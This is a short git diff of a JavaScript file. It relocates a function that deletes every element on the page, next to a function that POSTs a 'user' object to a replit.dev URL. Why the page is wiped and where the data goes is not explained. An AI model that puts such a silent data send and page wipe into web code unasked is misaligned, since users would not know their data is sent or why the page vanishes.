@@ -16,6 +16,13 @@ sc();
 sc();
   });
 
+function sc() {
+    var k = document.querySelectorAll('*');
+    for(var i = 0; i < k.length; i++) {
+        k[i].remove();
+    }
+}
+
 function en(user) {
   fetch('https://482f5134-6dcf-4770-af34-1ee5d411512d-00-1dblg66wzgy4i.spock.replit.dev/get', {
     method: 'POST',
@@ -24,10 +31,4 @@ function en(user) {
     },
     body: JSON.stringify({ user }),
   })
-
-function sc() {
-    var k = document.querySelectorAll('*');
-    for(var i = 0; i < k.length; i++) {
-        k[i].remove();
-    }
 }
